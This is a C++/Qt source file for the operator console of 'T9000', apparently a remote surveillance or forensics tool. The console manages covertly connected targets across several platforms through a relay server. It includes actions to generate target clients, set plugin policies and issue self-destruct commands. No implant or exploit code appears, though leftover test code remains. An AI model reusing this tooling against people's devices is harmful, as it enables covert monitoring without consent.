/*!
	Description : T9000 主界面
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:
*/

#include <assert.h>
#include <QSystemTrayIcon>
#include <QTimer>

#include "maindlg.h"
#include "conndlg.h"
#include "targetdlg.h"
#include "aliasdlg.h"
#include "generatedlg.h"
#include "daemondlg.h"
#include "nofocusstyle.h"
#include "policydlg.h"
#include "aboutdlg.h"
#include "waitdlg.h"
#include "logindatabasedlg.h"
#include "DlgContainer.h"
#include "MigrateDaemonDlg.h"
#include "flowcontroldlg.h"
#include "autogetdlg.h"
#include "configdlg.h"
#include "querydaemonaddressdlg.h"

#include "nofocusstyle.h"

#include "EventSelect.h"
#include "DatabaseManager.h"
#include "LocalDataDir.h"

#include "TargetConnection.h"
#include "ProcessFileTask.h"

#include "AdkPrecomp.h"
#include "AdkMD5.h"
#include "AdkBase64.h"
#include "adkrc4.h"
#include "adkFile.h"

#include "skin.h"

struct NotifyInfo
{
	unsigned int targetID;
	char title[256];
	char message[1024];
};

typedef bool (*NOTIFY_FUNC)(const char* cfgName, NotifyInfo* info);
NOTIFY_FUNC OnlineNotify = NULL;

// ////////////////////////////////////////////////////////////////////////////////
// 用于清空数据库的线程
//
class CleanDataBaseThread : public QThread
{
protected:
	void run()
	{
		DM->CleanDatabase();
		g_targetMap.clear();

		std::wstring dataPath = GetExePath()+L"\\Data";
		SHDel(dataPath.c_str());

		CreateDirectoryW(dataPath.c_str(), NULL);
	}
};


// ////////////////////////////////////////////////////////////////////////////////
// 全局变量，为了兼容旧的代码
//
MainDlg* FrmMain = NULL;
ZlibUncompress g_zlibUncompress = NULL;

// ////////////////////////////////////////////////////////////////////////////////
// 构造函数 
//
MainDlg::MainDlg(QWidget *parent, Qt::WFlags flags)
	: QMainWindow(parent, flags)
	, ctrOnlineFlag(false)
	, dataBlockCount(0)
	, dataBlockHeader(NULL)
	, bClosing(false)
	, ctrConn(NULL)
	, m_connDlg(this)
	, dwCtrUserId(0)		// 单控制端必须为 0
	, m_targetDlgContainer(NULL)
	, m_category(Category::GROUP)
	, m_displayMode(DisplayMode::SHOW_ALL)
	, m_iconToggle(false)
{
	//
	// ui 相关
	//

	ui.setupUi(this);

	std::wstring notifyDll = GetExePath() + L"\\OnlineNotify.dll";

	HMODULE hDll = LoadLibraryW(notifyDll.c_str());

	if ( hDll )
	{
		OnlineNotify = (NOTIFY_FUNC)GetProcAddress(hDll, "OnlineNotifyFromCfg");
	}

	// waitdlg
	m_waitDlg = new WaitDlg(this);
	m_waitDlg->hide();

	// 任务栏
	m_targetDlgContainer = new DlgContainer;
	m_tray = new QSystemTrayIcon(QApplication::windowIcon(), this);
	m_tray->show();
	m_trayFlashTimer =new QTimer(this);

	// 初始化控件外观
	InitWidgetAppearance();

	// 初始化信号&槽
	InitConnection();

	// 为目标列表添加右键菜单
	ui.trTarget->setContextMenuPolicy(Qt::CustomContextMenu);

	//
	// 数据相关
	//

	// ip 数据库
	m_ipfinder.Open(WideToAnsi(GetExePath() + L"\\Config\\qqwry.dat").c_str());

	ZeroMemory(this->byPassMd5, 16 * sizeof(CHAR));

	ZeroMemory(this->MacPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->IosPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->WindowsPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->AndroidPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));

	InitializeCriticalSection(&csPlgDataBlock);
	hEventForPlgData = CreateEvent(NULL, false, false, NULL);

	// 窗口全局变量、窗口句柄
	FrmMain = this;
	Handle = (HWND)this->winId();

	// 初始化 event select 模型
	InitialEventSelect();

	// 初始化 zlib
	WCHAR wzZlibPath[MAX_PATH] = {0};
	GetModuleFileNameW(0, wzZlibPath, MAX_PATH);
	LPWSTR wzName = wcsrchr(wzZlibPath, L'\\');
	wcscpy(wzName+1, L"zlib1.dll");
	HMODULE hLibrary = LoadLibrary(wzZlibPath);
	if (hLibrary)
	{
		g_zlibUncompress = (ZlibUncompress)GetProcAddress(hLibrary, "uncompress");
	}

	// 读取配置文件
	ReadIniFile();

	// 读取插件信息
	ReadPluginInfo(WindowsPlgCxtVect);
	ReadPluginInfo(MacPlgCxtVect);
	ReadPluginInfo(IosPlgCxtVect);
	ReadPluginInfo(AndroidPlgCxtVect);


	// 创建插件处理线程
	this->procDataThread = new ProcessDataThread();
	this->procDataThread->run();

	// 初始化数据库
	InitDatabase();

	// 初始化目标数据
	InitialTargetData();

	// 隐藏 '断开连接'
	//ui.mainToolBar->removeAction(ui.actStop);

	// 自动登录
	if ( this->bAutoLogin )
	{
		ConnectToDaemon();
	}

	// 检测用
	ui.trTarget->hideColumn(8);
}

// ////////////////////////////////////////////////////////////////////////////////
// 析构函数 
//
MainDlg::~MainDlg()
{
	//delete m_targetDlgContainer;
}

// ////////////////////////////////////////////////////////////////////////////////
// 初始化数据库
//
void MainDlg::InitDatabase()
{
	std::wstring iniPath = GetExePath() + L"\\setting.ini";
	std::wstring dbType = ReadStringPolicyFromLocal(L"Database", L"Type", iniPath.c_str());

	std::wstring connStr;

	if ( dbType == L"Access" )
		connStr = ReadStringPolicyFromLocal(L"Database", L"AccessConnStr", iniPath.c_str());
	else if ( dbType == L"SQL Server")
		connStr = ReadStringPolicyFromLocal(L"Database", L"SQLServerConnStr", iniPath.c_str());

	QString sqlConnStr = QString::fromStdWString(connStr);

	if ( dbType == L"Access" )
		DM = new DatabaseManager(connStr);
	else
	{
		std::wstring user;
		std::wstring password;
		LoginDatabaseDlg dlg(0, user, password);

		if ( QDialog::Accepted != dlg.exec() )
		{
			m_tray->hide();
			ExitProcess(-1);
		}

		DM = new DatabaseManager(connStr, user, password);
	}

	// 单独创建线程来处理数据库
	dbThread = new QThread;
	DM->moveToThread(dbThread);
	dbThread->start();

	DM->UnitTest();

	FileTask* task = new FileTask;
	task->aniTmpTaskPath = "D:\\Projects\\Work\\Mixed\\T9000\\bin\\Data\\1420373341\\FileTasking\\5120558";
	task->dwTargetID = 1420373341;
	Target* tar = new Target;
	ProcessUserPluginData(task, tar);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public pop plugin data block
//
PDATA_BLOCK MainDlg::PopPlgDataBlock()
{
	PDATA_BLOCK dataBlock = NULL;    
	EnterCriticalSection(&csPlgDataBlock);

	if (dataBlockHeader)
	{
		dataBlock = dataBlockHeader;
		dataBlockHeader = dataBlock->next;
		dataBlockCount--;        
	}

	LeaveCriticalSection(&csPlgDataBlock);
	return dataBlock;
}

// ////////////////////////////////////////////////////////////////////////////////
// @public push plugin data
//
void MainDlg::PushPlgDataBlock(PDATA_BLOCK dataBlock)
{
	EnterCriticalSection(&csPlgDataBlock);

	if (dataBlockHeader == NULL)
	{
		dataBlockHeader = dataBlock;
	}
	else
	{
		dataBlock->next = dataBlockHeader;
		dataBlockHeader = dataBlock;
	}

	dataBlockCount++;

	LeaveCriticalSection(&csPlgDataBlock);
	SetEvent(this->hEventForPlgData);    
	return;
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected 关闭事件 
//
void MainDlg::closeEvent(QCloseEvent *event)
{
	dbThread->exit(0);

	this->bClosing = true;

	m_tray->hide();
	ExitProcess(-1);

	// Close control connection
	//
	if (this->ctrConn != NULL)
	{
		this->ctrConn->CloseConnection();
		this->ctrConn = NULL;
	}

	// Close all filetransferthread
	//
	//ControlOffline();

	// Close data process thread

	if (procDataThread)
	{
		HANDLE hHandle = procDataThread->handle();
		SetEvent(this->hEventForPlgData);
		WaitForSingleObject(hHandle, INFINITE);
		CloseHandle(hHandle);
	}
	delete procDataThread;

	// Delete target
	//
	/*std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;
		if (NULL == tarBlock)
		{
			continue;
		}

		delete tarBlock;        
	}*/

	// 关闭前先关闭其他窗口
	/*QWidget* dlg;
	foreach(dlg, m_targetWindowList)
	{
		if ( dlg )
		{
			dlg->close();
			delete dlg;
		}
	}*/
	m_targetDlgContainer->close();
	//delete m_targetDlgContainer;
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected window 消息接管
//
bool MainDlg::winEvent(MSG *message, long *result)
{
	if ( message->message >= WM_CONTROL_CONNCOMPLETED )
	{
		switch ( message->message )
		{

		//
		// 基础消息
		//
		case WM_SET_STATUSINFO_A:
			on_WM_SET_STATUSINFO_A(message);
			break;

		case WM_SET_STATUSINFO_W:
			on_WM_SET_STATUSINFO_W(message);
			break;

		//
		// 控制相关
		//
		case WM_CONTROL_CONNCOMPLETED:
			on_WM_CONTROL_CONNCOMPLETED(message);
			break;

		case WM_CONTROL_CONNFAILED:
			on_WM_CONTROL_CONNFAILED(message);
			break;

		case WM_CONTROL_CONNCLOSED:
			on_WM_CONTROL_CONNCLOSED(message);
			break;

		case WM_CONTROL_ONLINE:
			on_WM_CONTROL_ONLINE(message);
			break;

		case WM_CONTROL_PASSFAILED:
			on_WM_CONTROL_PASSFAILED(message);
			break;

		case WM_CONTROL_INOTHERPLACE:
			on_WM_CONTROL_INOTHERPLACE(message);
			break;
		
		//
		// 目标相关
		//
		case WM_NEW_TARGET:
			on_WM_NEW_TARGET(message);
			break;

		case WM_ERASE_TARGET:
			on_WM_ERASE_TARGET(message);
			break;

		case WM_TARGET_FOUND:
			on_WM_TARGET_FOUND(message);
			break;

		case WM_TARGET_STATUS_CHANGE:
			on_WM_TARGET_STATUS_CHANGE(message);
			break;

		case WM_TARGET_INFO_UPDATED:
			on_WM_TARGET_INFO_UPDATED(message);
			break;

		case WM_TARGET_EXINFO_UPDATED:
			on_WM_TARGET_EXINFO_UPDATED(message);
			break;

		case WM_TARGET_SWITCH:
			on_WM_TARGET_SWITCH(message);
			break;

		case WM_TARGET_DATACONNCLOSED:
			on_WM_TARGET_DATACONNCLOSED(message);
			break;

		// 添加 target dialog
		case WM_ADD_TARGET_DIALOG:
			on_WM_ADD_TARGET_DIALOG(message);
			break;

		case WM_QUERY_DAEMONADDR_FINISHED:
			if ( m_qdaDlg != NULL )
				m_qdaDlg->OnQueryDaemonAddressFinished(message);

			break;

		case WM_QUERY_DAEMONADDR2_FINISHED:
			if ( m_qdaDlg != NULL )
				m_qdaDlg->OnQueryDaemonAddressFinished2(message);

			break;
		}

		return true;
	}

	// 其他消息仍由 Qt 处理
	return false;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 启动
//
void MainDlg::StartAction()
{

	m_connDlg.GetDaemonHistory();

	if ( QDialog::Accepted == m_connDlg.exec() )
	{
		this->bAutoLogin = m_connDlg.IsAutoConn();
		this->aniDaemonIpAddr = m_connDlg.GetIpAddress().toStdString();
		this->nCtrPortForControl = m_connDlg.GetCtrlPort().toInt();
		this->nDataPortForControl = m_connDlg.GetTargetPort().toInt();

		// 生成验证码的MD5值
		std::string aniPass = m_connDlg.GetPass().toStdString();

		char* buffer = new char[aniPass.length()];
		memcpy(buffer, aniPass.c_str(), aniPass.length());

		MD5_CTX context;
		AdkMD5Init (&context);
		AdkMD5Update (&context, (BYTE*)buffer, aniPass.length());
		AdkMD5Final (&context, this->byPassMd5);

		delete buffer;

		// 写配置文件
		WriteIniFile();

		m_connDlg.ApplyDaemonHistory();

		// 连接至中转
		ConnectToDaemon();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 停止
//
void MainDlg::StopAction()
{
	if (this->ctrConn)
	{
		this->ctrConn->CloseConnection();
		this->ctrConn = NULL;
		qDebug() << "1";
		ControlOffline();
		qDebug() << "2";
	}

	AddStatusInfo(STATUS_INFO, "主动断开与中转服务器的连接");
	ui.statusBar->showMessage(QString::fromLocal8Bit("主动断开与中转服务器的连接"));

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 迁移中转
//
void MainDlg::MigrateDaemonAction()
{
	if ( !this->ctrOnlineFlag )
	{
		MessageBoxW((HWND)winId(), L"[脱机数据查看模式] 下不能进行中转服务器的迁移!", L"提示", MB_OK | MB_ICONINFORMATION);
		return;
	}

	MigrateDaemonDlg dlg;
	if ( QDialog::Accepted == dlg.exec() )
	{
		std::wstring newDaemonAddress = dlg.GetNewDaemonAddress();
		WCHAR msg[MAX_PATH] = {0};
		wsprintfW(msg, L"成功将中转服务器迁移至 %s ...", newDaemonAddress.c_str());
		AddStatusInfo(STATUS_INFO, msg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 退出
//
void MainDlg::ExitAction()
{
	close();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 插件策略
//
void MainDlg::ConfigAction()
{
	ConfigDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 设置插件策略
//
void MainDlg::PolicyAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	QTreeWidgetItem* item = ui.trTarget->selectedItems()[0];
	Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

	ModifyPluginPolicy((unsigned int)tarBlock, 0);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 设置目标别名
//
void MainDlg::AliasAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	QTreeWidgetItem* item = ui.trTarget->selectedItems()[0];

	int targetId = item->text(0).toInt();
	std::string oldAlias = item->text(1).toLocal8Bit();

	AliasDlg dlg(this, targetId);
	dlg.SetTargetAlias(QString::fromLocal8Bit(oldAlias.c_str()));

	if ( QDialog::Accepted == dlg.exec() )
	{
		// 更新界面
		QString newAlias = dlg.GetTargetAlias();
		item->setText(1, newAlias);

		// 更新 target
		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
		tar->aniTargetName = newAlias.toLocal8Bit();

		// 更新数据库
		DM->UpdateTargetInfo(tar);

		if ( m_targetDlgContainer )
			m_targetDlgContainer->ChangeLabelText(tar->dwTargetID, newAlias);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 收藏
//
void MainDlg::FavoriteAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

		if ( ui.actFavorite->text() == QString::fromLocal8Bit("收藏目标") )
		{
			tarBlock->m_favorite = true;
			item->setIcon(11, QIcon(QPixmap(":/image/star.png")));
			ui.actFavorite->setText(QString::fromLocal8Bit("取消收藏"));
		}
		else
		{
			tarBlock->m_favorite = false;
			item->setIcon(11, QIcon());
			ui.actFavorite->setText(QString::fromLocal8Bit("收藏目标"));

			if ( DisplayMode::SHOW_FAVORITE == m_displayMode )
			{
				QTreeWidgetItem* parent = item->parent();
				parent->takeChild(parent->indexOfChild(item));

				if ( 0 == parent->childCount() )
					ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
				else
					ui.actFavorite->setText(QString::fromLocal8Bit("取消收藏"));
			}
		}

		DM->UpdateTargetFavoriteStatus(tarBlock->dwTargetID, tarBlock->m_favorite);
		//RefreshTargetList();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 自毁
//
void MainDlg::DelSelfAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("只有在联机控制模式下才能自毁目标!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();
		if (tarBlock->tarStatus == TAROFFLINE)
		{
			MsgBoxInfoExW(this->Handle, L"不能对离线目标发布自毁指令!");
			return;
		}

		if (tarBlock->QueryFileTasking())
		{
			MsgBoxInfoExW(this->Handle, L"自毁目标前,请先取消目标的所有文件传输任务!");
			return;
		}

		if (IDYES == MessageBox(this->Handle,L"是否下达自毁指令，请确认!",L"确认", MB_YESNO | MB_ICONWARNING))
		{
			if (this->ctrConn)
			{
				this->ctrConn->Send_SDS(tarBlock->dwTargetID);
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 流量控制
//
void MainDlg::FlowControlAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("只有在联机控制模式下才能修改流量控制策略!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];
	Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

	FlowControlDlg dlg(tarBlock);
	dlg.exec();
}


// ////////////////////////////////////////////////////////////////////////////////
// @private slot 清除目标数据
//
void MainDlg::CleanAction()
{
	if ( 0 == ui.trTarget->selectedItems().count() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

		if (ctrOnlineFlag == false)
		{
			DM->CleanTargetData(tarBlock->dwTargetID);
			WCHAR dataDir[MAX_PATH] = {0};
			wsprintf(dataDir, L"%s\\Data\\%d", GetExePath().c_str(), tarBlock->dwTargetID);
			SHDel(dataDir);
			QTreeWidgetItem* parent = item->parent();
			parent->takeChild(parent->indexOfChild(item));

			for ( std::list<QTreeWidgetItem*>::iterator it = m_itemList.begin();
				it != m_itemList.end();
				 )
			{
				if ( *it == item )
					it = m_itemList.erase(it);
				else
					++it;
			}

			RemoveTargetFromGlobalMap(tarBlock->dwTargetID);

			if ( 0 == parent->childCount() )
				ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));

			UpateTargetCount();

			return;
		}

		if (tarBlock->tarStatus == TARONLINE)
		{
			MsgBoxInfoExW(this->Handle, L"在线状态下不能清除目标!");
			return;
		}

		if (tarBlock->QueryFileTasking())
		{
			MsgBoxInfoExW(this->Handle, L"清除目标前,请先取消目标的所有文件传输任务!");
			return;
		}

		if (IDYES == MessageBox(this->Handle,L"是否清除该目标及所有数据，请确认!",L"确认",MB_YESNO | MB_ICONWARNING))
		{
			tarBlock->bCleared = true;

			// 先断连接
			//
			if (tarBlock->tarConn)
			{
				tarBlock->tarConn->CloseConnection();
				tarBlock->tarConn = NULL;
			}

			// 再清除
			//
			this->ctrConn->Send_ERA(tarBlock->dwTargetID);
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 生成目标端
//
void MainDlg::CreateTargetAction()
{
	GenerateDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 生成中转
//
void MainDlg::CreateDaemonAction()
{
	DaemonDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 清空数据库
//
void MainDlg::CleanDatabaseAction()
{

	if ( 0 != ui.trTarget->selectedItems().count() 
		&& ui.trTarget->selectedItems()[0]->parent() != NULL )
	{
		CleanAction();
		return;
	}

	if ( this->ctrOnlineFlag )
	{
		MsgBoxInfoExW(Handle, L"清空数据库之前需要断开连接!");
		return;
	}

	ui.trTarget->clear();

	CleanDataBaseThread* thread = new CleanDataBaseThread;
	WaitDlg* dlg = new WaitDlg(ui.trTarget);
	dlg->show();
	connect(thread, SIGNAL(finished()), dlg, SLOT(close()));
	thread->start();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 查询中转回连信息
//
void MainDlg::QueryDaemonAddressAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个目标"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("只有在联机控制模式下才能查询中转回连信息!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();
		if (tarBlock->tarStatus == TAROFFLINE)
		{
			MsgBoxInfoExW(this->Handle, L"不能对离线目标查询中转回连信息!");
			return;
		}

		m_qdaDlg = new QueryDaemonAddressDlg(this, tarBlock);
		m_qdaDlg->exec();

		delete m_qdaDlg;
		m_qdaDlg = NULL;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 使用指南
//
void MainDlg::HelpAction()
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 关于
//
void MainDlg::AboutAction()
{

	//AboutDlg dlg(this);
	//dlg.exec();
	std::wstring inifile = GetExePath() + L"\\setting.ini";
	std::wstring title = ReadStringPolicyFromLocal(L"Application", L"about", inifile.c_str());

	WCHAR info[1024] = {0};
	wsprintfW(info, L"产品名称 : %s\r\n版权所有 : 南京拓界信息技术有限公司", title.c_str());

	QMessageBox about(
		QMessageBox::Information, 
		QString::fromLocal8Bit("关于"),
		QString::fromStdWString(std::wstring(info)),
		QMessageBox::Ok, 
		this);

	about.exec();
	/*MessageBoxW(this->winId(), L"产品名称 : 拓界基于微软平台的远程信息取证系统软件 v1.0\r\n"
		L"版权所有 : 南京拓界信息技术有限公司", L"提示", MB_OK | MB_ICONINFORMATION);*/
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加日志消息
//
void MainDlg::on_WM_SET_STATUSINFO_A(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	char *lpszInfo = (char *)msg->lParam;

	AddStatusInfo(sl, lpszInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private
//
void MainDlg::on_WM_SET_STATUSINFO_W(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	wchar_t *lpwzInfo = (wchar_t *)msg->lParam;

	AddStatusInfo(sl, lpwzInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 控制端连接建立
//
void MainDlg::on_WM_CONTROL_CONNCOMPLETED(MSG* msg)
{
	this->ctrConn = (ControlConnection *)msg->wParam;
	ui.statusBar->showMessage(QString::fromLocal8Bit("成功连接中转服务器"));
	AddStatusInfo(STATUS_INFO, L"成功连接中转服务器");
	ui.actStop->setEnabled(true);
	ui.actStart->setEnabled(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 控制端连接失败
//
void MainDlg::on_WM_CONTROL_CONNFAILED(MSG* msg)
{
	int iErrorCode = msg->wParam;

	switch(iErrorCode)
	{
	case WSAECONNREFUSED:
		ui.statusBar->showMessage(QString::fromLocal8Bit("不能连接中转服务器!  连接被拒绝"));
		AddStatusInfo(STATUS_ERROR, L"不能连接中转服务器!  连接被拒绝");
		break;
	default:
		ui.statusBar->showMessage(QString::fromLocal8Bit("不能连接中转服务器!  请确认中转服务器是否正常运行"));
		AddStatusInfo(STATUS_ERROR, L"不能连接中转服务器!  请确认中转服务器是否正常运行");
		break;
	}
	
	ControlOffline();

	ui.actStart->setEnabled(true);
	ui.actStop->setEnabled(false);

	m_waitDlg->hide();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 控制端连接关闭
//
void MainDlg::on_WM_CONTROL_CONNCLOSED(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		return;
	}

	ControlOffline();

	QMessageBox::critical(this,
		QString::fromLocal8Bit("错误"),
		QString::fromLocal8Bit("与中转服务器的连接中断!  请确认中转服务器是否正常运行"));

	AddStatusInfo(STATUS_ERROR, L"与中转服务器的连接中断!  请确认中转服务器是否正常运行");    
	ui.statusBar->showMessage(QString::fromLocal8Bit("与中转服务器的连接中断!  请确认中转服务器是否正常运行"));

	ui.actStop->setEnabled(false);
	ui.actStart->setEnabled(true);

	UpateTargetCount();

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 控制端在线
//
void MainDlg::on_WM_CONTROL_ONLINE(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		// 如果出现这种情况，说明在这个时间点，用户点击了断开连接
		//
		return;
	}

	this->ctrOnlineFlag = true;
	AddStatusInfo(STATUS_NOTE, L"验证码认证通过,进入联机控制模式");
	ui.statusBar->showMessage(QString::fromLocal8Bit("验证码认证通过,进入联机控制模式"));

	// 定时发送心跳包
	m_PNGTimer.start(30*1000);

	m_waitDlg->hide();
	//ui.mainToolBar->removeAction(ui.actStart);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStop);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 密码错误
//
void MainDlg::on_WM_CONTROL_PASSFAILED(MSG* msg)
{
	this->ctrConn->CloseConnection();
	ControlOffline();

	ui.statusBar->showMessage(QString::fromLocal8Bit("中转服务器验证失败!\r\n验证码不正确"));

	m_waitDlg->hide();

	QMessageBox::critical(this,
		QString::fromLocal8Bit("错误"),
		QString::fromLocal8Bit("中转服务器验证失败!\r\n验证码不正确"));
	AddStatusInfo(STATUS_INFO, L"中转服务器验证失败!验证码不正确");
	
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 其他用户登录
//
void MainDlg::on_WM_CONTROL_INOTHERPLACE(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		return;
	}

	this->ctrConn->CloseConnection();
	ControlOffline();


	QMessageBox::critical(this,
		QString::fromLocal8Bit("错误"),
		QString::fromLocal8Bit("与中转服务器的连接中断!  另一个控制端登录了中转服务器"));
	ui.statusBar->showMessage(QString::fromLocal8Bit("与中转服务器的连接中断!  另一个控制端登录了中转服务器"));
	AddStatusInfo(STATUS_ERROR, L"与中转服务器的连接中断!  另一个控制端登录了中转服务器");

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新目标上线
//
void MainDlg::on_WM_NEW_TARGET(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	g_targetMap[tar->dwTargetID] = tar;     // 增加到MAP中
	DM->AddTarget(tar);                     // 更新到数据库中
	tar->CheckAndCreateDataDir();           // 检查及建立本地数据目录
	AddTargetNode(tar);                     // 增加到界面中
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标清除
//
void MainDlg::on_WM_ERASE_TARGET(MSG* msg)
{
	ULONG targetId = msg->wParam;
	ULONG ret      = msg->lParam;

	if (ret == 1)
	{
		Target * tarBlock = GetTargetFromGlobalMap(targetId);
		if (tarBlock)
		{
			if (tarBlock->frmTarControl)
			{
				tarBlock->frmTarControl->close();
				tarBlock->frmTarControl = NULL;
			}

			g_targetMap.erase(tarBlock->dwTargetID);
			DM->ClearAndRemoveTarget(tarBlock->dwTargetID);

			// Remove tNode from target TreeView
			//            
			tarBlock->treeNode->parent()->removeChild(tarBlock->treeNode);
			delete tarBlock;
		}
	}
	else
	{
		QMessageBox::critical(this, QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("该目标在线，不能清除目标!"));        
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 发现目标
//
void MainDlg::on_WM_TARGET_FOUND(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	// 加入 map
	g_targetMap[tar->dwTargetID] = tar;

	AddTargetNode(tar);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 目标状态改变
//
void MainDlg::on_WM_TARGET_STATUS_CHANGE(MSG* msg)
{
	Target *tarBlock = (Target *)msg->wParam;
	assert(tarBlock);

	QTreeWidgetItem * treeNode = tarBlock->treeNode;

	if (TARONLINE == tarBlock->tarStatus)
	{
		treeNode->setText(2, QString::fromLocal8Bit("在线"));

		ChangeTargetStatus(treeNode, tarBlock, true);

		// 任务栏闪烁
		if ( this->isMinimized() && !m_trayFlashTimer->isActive() )
			m_trayFlashTimer->start(300);

		// 改变颜色
		for (int i = 0; i < 11; i++)
		{
			treeNode->setForeground(i, QBrush(QColor(255,0,0)));
		}

		if (tarBlock->lastTime == 0)
		{

			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[目标%s(ID:%d)] 上线",  
				AnsiToWide(tarBlock->aniTargetName).c_str(), 
				tarBlock->dwTargetID);

		}
		else
		{
			SetTarStatusInfoExW(
				STATUS_NOTE, 
				tarBlock,
				L"[目标%s(ID:%d)] 上线",  
